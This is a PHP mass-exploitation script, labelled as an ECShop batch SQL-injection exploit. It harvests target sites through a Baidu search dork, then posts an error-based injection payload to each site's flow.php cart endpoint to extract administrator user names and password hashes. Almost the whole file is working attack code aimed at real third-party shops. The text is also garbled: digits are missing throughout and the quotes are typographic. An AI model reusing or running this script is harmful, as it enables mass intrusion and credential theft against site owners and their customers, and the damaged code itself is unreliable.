
<?php  
/**
 * Created by 独自等待
 * Date: --
 * Time: 下午:
 * Name: ecshop_batch.php
 * 独自等待博客：[url]http://www.waitalone.cn/[/url]
 */  
print_r(‘  
+——————————————————+  
                 Ec_Shop 批量注入EXP  
             Site：[url]http://www.waitalone.cn/[/url]  
                Exploit BY： 独自等待  
                  Time：--  
+——————————————————+  
‘);  
if ($argc < ) {  
    print_r(‘  
+——————————————————+  
Useage: php ’ . $argv[] . ’ keywords  
keywords：keywords for search ecshop  
Example: php ’ . $argv[] . ’ “inurl:flow.php”  
+——————————————————+  
    ’);  
    exit;  
}  
set_time_limit();  
error_reporting();  
//统计时间  
$start_time = func_time();  
$keywords = $argv[];  
$s_url = ’[url]http://www.baidu.com/s?wd=[/url]’ . $keywords . ’&pn=&ie=utf-&usm=&rsv_page=&rn=′;  
$content = file_get_contents($s_url);  
if (preg_match_all(‘/\’{“title”:“(.*)”,“url”:“(.*)”}\’>/i’, $content, $match)) {  
    echo ’共获取了’ . count($match[]) . “条结果。\n”;  
    foreach ($match[] as $value) {  
        echo getRealUrl($value);  
        $fp = fopen(‘list.txt’, ’a');  
        fwrite($fp, getRealUrl($value));  
        fclose($fp);  
    }  
}  
//for ($i = ; $i < count($match[]);$i++){  
//    echo $match[][$i] . getRealUrl($match[][$i]) . ’’;  
//}  
$exp = ’goods_number%B%+and+%select++from%select+count%*%%Cconcat%%select+%select+%SELECT+concat%×,user_name%Cxc%Cpassword,×%+FROM+ecs_admin_user+limit+%C%%+from+information_schema.tables+limit+%C%%Cfloor%rand%%*%%x+from+information_schema.tables+group+by+x%a%+and+%D+%%D=&submit=exp‘;  
$ar_result = file(‘list.txt’);  
$ar_result = array_unique($ar_result);  
//print_r($ar_result);  
for ($i = ; $i < count($ar_result); $i++) {  
    $host = trim($ar_result[$i]);  
    if (preg_match(‘/Duplicate entry \’#(.*)#\’ for key/i’, send_pack($exp), $match)) {  
            echo ’批量注入结果：’ . $host . ’|' . iconv(‘utf-′, ’gbk//IGNORE’, $match[]) . ”\n”;  
        }  
}  
//获取百度真实URL函数  
function getRealUrl($url)  
{  
    $header = get_headers($url, );  
    //print_r($header);  
    if (strpos($header[], ’′)) {  
        if (is_array($header['Location'])) {  
            $p_url = parse_url($header['Location'][]);  
            return $p_url['host'] . “\n”;  
        } else {  
            $p_url = parse_url($header['Location']);  
            return $p_url['host'] . “\n”;  
        }  
    } else {  
        return $url . “\n”;  
    }  
}  
   
//发送数据包函数  
function send_pack($code)  
{  
    global $host;  
    $data = “POST /flow.php?step=update_cart HTTP/.\r\n”;  
    $data .= “Host: $host\r\n”;  
    $data .= “User-Agent: BaiduSpider\r\n”;  
    $data .= “Content-Type: application/x-www-form-urlencoded\r\n”;  
    $data .= “Content-Length: ” . strlen($code) . “\r\n”;  
    $data .= “Connection: Close\r\n\r\n”;  
    $data .= $code . “\r\n”;  
    //echo $data;exit;  
    $fp = @fsockopen($host, , $errno, $errstr, );  
    //echo ini_get(‘default_socket_timeout’);//默认超时时间为秒  
    if (!$fp) {  
        //echo $errno . ’–>’ . $errstr . ”\n”;  
        echo ’Could not connect to: ’ . $host;  
    } else {  
        fwrite($fp, $data);  
        $back = ”;  
        while (!feof($fp)) {  
            $back .= fread($fp, );  
        }  
        fclose($fp);  
    }  
    return $back;  
}  
   
//时间统计函数  
function func_time()  
{  
    list($microsec, $sec) = explode(‘ ’, microtime());  
    return $microsec + $sec;  
}  
   
echo ’脚本执行时间：’ . round((func_time() - $start_time), ) . ’秒’;  
?>  